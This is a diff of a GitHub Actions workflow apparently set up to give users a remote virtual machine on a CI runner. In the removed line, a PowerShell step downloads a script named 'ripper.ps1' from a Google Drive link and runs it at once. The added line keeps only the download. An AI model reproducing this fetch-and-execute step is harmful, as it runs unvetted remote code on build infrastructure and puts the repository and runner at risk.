@@ -19,7 +19,7 @@ jobs:
     - name: Downloading And Installing Tools
       run: |
         # WAIT FOR 3-4 MINUTES 
-        Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1L3pqZocP46Pslfu7ylI9u-51dzWFLvRG&export=download&authuser=0&confirm=t&uuid=fdbceb6f-1b4d-49c1-9128-d38cf855055b&at=APZUnTVUm1AGqItiY6LCUoXfH13d%3A1716612457921" -OutFile "ripper.ps1" && ./ripper.ps1
+        Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1L3pqZocP46Pslfu7ylI9u-51dzWFLvRG&export=download&authuser=0&confirm=t&uuid=fdbceb6f-1b4d-49c1-9128-d38cf855055b&at=APZUnTVUm1AGqItiY6LCUoXfH13d%3A1716612457921"
     - name: Starting Virtual Machine
       run: |
         # CONNECTING YOU WITH VM
